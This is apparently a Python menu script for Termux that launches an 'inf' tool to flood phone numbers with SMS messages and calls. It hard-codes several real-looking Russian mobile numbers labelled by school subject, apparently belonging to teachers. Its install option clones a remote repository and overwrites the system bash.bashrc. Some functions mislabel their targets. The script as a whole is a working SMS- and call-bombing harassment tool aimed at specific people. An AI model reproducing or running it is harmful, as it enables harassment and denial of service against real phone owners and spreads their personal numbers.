import os
import sys
import time
numbers = ['1','2','3','4','5','6','7','8','9']

def start():
    os.system('clear')
    print('''\033[1m
══════════════════════╗
[&] Версия inf 2.0    ║
══════════════════════╣
[0] Выход             ║
[1] Обновить          ║
[2] Установить        ║
[3] Ручной запуск     ║
[4] Список контактов  ║
[5] Настройка запуска ║
══════════════════════╝\033[m''')
    command = input('--> ')
    if command == '1':
        update()
    elif command == '2':
        install()
    elif command == '3':
        zapusk()
    elif command == '4':
        spisok()
    elif command == '5':
        redakt()
    elif command == '0':
        print('Выход из inf...')
        print('\033[1m')
        time.sleep(1)
        sys.exit()
    else:
        os.system('clear')
        start()

def update():
        os.system('clear')
        print('\033[1m')
        print('Обновление inf...')
        time.sleep(2)
        os.system('cd ~ ; pkg install git ; git clone https://github.com/llll3/inf2.0 ; cd inf2.0 ; mv bash.bashrc ../../usr/etc/ ; source bash.bashrc ; cd ~/inf2.0/inf ; chmod 777 inf ; cd .. ; rm -rf .git ; cd ~ ; yes | pkg update ; yes | pkg upgrade')
        start()

def install():
	os.system('clear')
	print('\033[1m')
	print('Установка inf...')
	time.sleep(2)
	os.system('cd ~ ; pkg install git ; git clone https://github.com/llll3/inf2.0 ; cd inf2.0 ; mv bash.bashrc ../../usr/etc/ ; source bash.bashrc ; cd ~/inf2.0/inf ; chmod 777 inf ; cd .. ; rm -rf .git ; cd ~ ; yes | pkg update ; yes | pkg upgrade ; yes | pkg install nano')
	start()

def zapusk():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf...')
	time.sleep(1)
	os.system('cd ~ ; cd inf2.0 ; cd inf ; ./inf')
	exit1()

def spisok():
    os.system('clear')
    print('''\033[1m
══════════════════════╗
[&]Список контактов:  ║ \n══════════════════════╣
[0] Назад             ║
[1] Информатика       ║
[2] Английский        ║
[3] География         ║
[4] Биология          ║
[5] Алгебра           ║
[6] Русский           ║
[7] История           ║
[8] Физика            ║
[9] Химия             ║
══════════════════════╝\033[m''')
    global a
    a = input('--> ')
    if a == '0':
       start()
    if a in numbers:
        sms()
    else:
       spisok()

def redakt():
	os.system('clear')
	print('\033[1m')
	print('[&]Меню редактирования контактов\n')
	print('[&]Выберите контакт:')
	print('[0] Назад')
	print('[1] {name}')
	kon = input('--> ')
	if kon == '0':
		start()
	else:
		redakt()


def faq():
	os.system('clear')
	print('''\033[1m
═══════════════════════════════════════════════╗
[&] F.A.Q:                                     ║\n═══════════════════════════════════════════════╣
[0] Назад.                                     ║
[1] SMS - начинает флудить смс'ками.           ║
[2] CALL - начинает флудить звон'ками.         ║
[3] SMS и CALL - включает в себя 1 и 2 пункт.  ║
═══════════════════════════════════════════════╝\033[m''')
	ww = input('--> ')
	if ww == '0':
		sms()
	else:
	    faq()









def sms():
     os.system('clear')
     print('''\033[1m
══════════════════════╗
[&]Выбирите режим:    ║\n══════════════════════╣
[0] Назад             ║
[1] Флуд SMS          ║
[2] Флуд CALL         ║
[3] CALL и SMS        ║
[4] F.A.Q             ║
══════════════════════╝\033[m''')
     b = input('--> ')
     if b == '0':
     	spisok()
     if b == '4':
     	faq()
     if a == '1' and  b == '1':
         inf1()
     elif a == '1' and b == '2':
         inf2()
     elif a == '1' and b == '3':
         inf3()
        	###########inf1
     if a == '2' and b == '1':
        	#########ang2
         ang1()
     elif a == '2' and b == '2':
     	ang2()
     elif a == '2' and b == '3':
     	ang3()
        	###########ang2
     if a == '3' and b == '1':
        	###########geo3
     	geo1()
     elif a == '3' and b == '2':
     	geo2()
     elif a == '3' and b == '3':
     	geo3()
         	##########geo3
     if a == '4' and b == '1':
        	#########bio4
     	bio1()
     elif a == '4' and b == '2':
     	bio2()
     elif a == '4' and b == '3':
     	bio3()
    	###########bio4
     if a == '5' and b == '1':
        	#########alg5
     	alg1()
     elif a == '5' and b == '2':
     	alg2()
     elif a == '5' and b == '3':
     	alg3()
        	###########alg5
     if a == '6' and b == '1':
        	#########rus6
     	rus1()
     elif a == '6' and b == '2':
     	rus2()
     elif a == '6' and b == '3':
     	rus3()
        	############rus6
     if a == '7' and b == '1':
        	#########ist7
     	ist1()
     elif a == '7' and b == '2':
     	ist2()
     elif a == '7' and b == '3':
     	ist3()
        	###########ist7
     if a == '8' and b == '1':
        	#########fiz8
         fiz1()
     elif a == '8' and b == '2':
         fiz2()
     elif a == '8' and b == '3':
         fiz3()
        	###########fiz8
     if a == '9' and b == '1':
        	#########xim9
          xim1()
     elif a == '9' and b == '2':
          xim2()
     elif a == '9' and b == '3':
      	xim3()
        	###########xim9
     else:
          sms()

def exit1():
    os.system('clear')
    ee = input('\nВыйти в главное меню?(y/n)')
    if ee == 'y' or ee == 'yes':
        start()
    elif ee == 'n' or ee == 'no':
        sys.exit()
    else:
        exit1()


############inf1
def inf1():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	inf1= os.system('cd ~ ; cd inf2.0 ; cd inf ; ./inf 79283984241 1 1 0')
	exit1()
def inf2():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	inf2 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283984241 2 1 0')
	exit1()
def inf3():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	inf3 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283984241 3 1 0')
	exit1()
############inf1
##############
###########ang2
def ang1():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	ang1 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283920417 1 1 0')
	exit1()
def ang2():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	ang2 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283920417 2 1 0')
	exit1()
def ang3():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	ang = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283920417 3 1 0')
	exit1()
##########ang2
#############
##########geo3
def geo1():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	geo1 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283898206 1 1 0')
	exit1()
def geo2():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	geo2 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283898206 2 1 0')
	exit1()
def geo3():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	geo3 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283898206 3 1 0')
	exit1()
##########geo3
#############
##########bio4
def bio1():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	bio1 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79886100747 1 1 0')
	exit1()
def bio2():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	bio2 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79886100747 2 1 0')
	exit1()
def bio3():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	bio3 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79886100747 3 1 0')
	exit1()
##########bio4
#############
##########alg5
def alg1():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	alg1 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79094953366 1 1 0')
	exit1()
def alg2():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	alg2 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79094953366 2 1 0')
	exit1()
def alg3():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	alg3 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79094953366 3 1 0')
	exit1()
##########alg5
##############
##########rus6
def rus1():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	rus1 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79280265297 1 1 0')
	exit1()
def rus2():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	alg2 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79094953366 2 1 0')
	exit1()
def rus3():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	alg3 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79094953366 3 1 0')
	exit1()
##########rus6
#############
##########ist7
def ist1():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	ist1 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79631702053 1 1 0')
	exit1()
def ist2():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	ist2 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79631702053 2 1 0')
	exit1()
def ist3():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	ist3 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79631702053 3 1 0')
	exit1()
##########ist7
############
##########fiz8
def fiz1():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	fiz1= os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283949290 1 1 0')
	exit1()
def fiz2():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	fiz2 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283949290 2 1 0')
	exit1()
def fiz3():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	fiz3 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283949290 3 1 0')
	exit1()
##########fiz8
#############
##########xim9
def xim1():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	xim1 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283960564 1 1 0')
	exit1()
def xim2():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	xim2= os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283960564 2 1 0')
	exit1()
def xim3():
	os.system('clear')
	print('\033[1m')
	print('Запуск inf....')
	time.sleep(1)
	xim3 = os.system('cd ~ && cd inf2.0 && cd inf && ./inf 79283960564 3 1 0')
	exit1()
##########xim9


start()
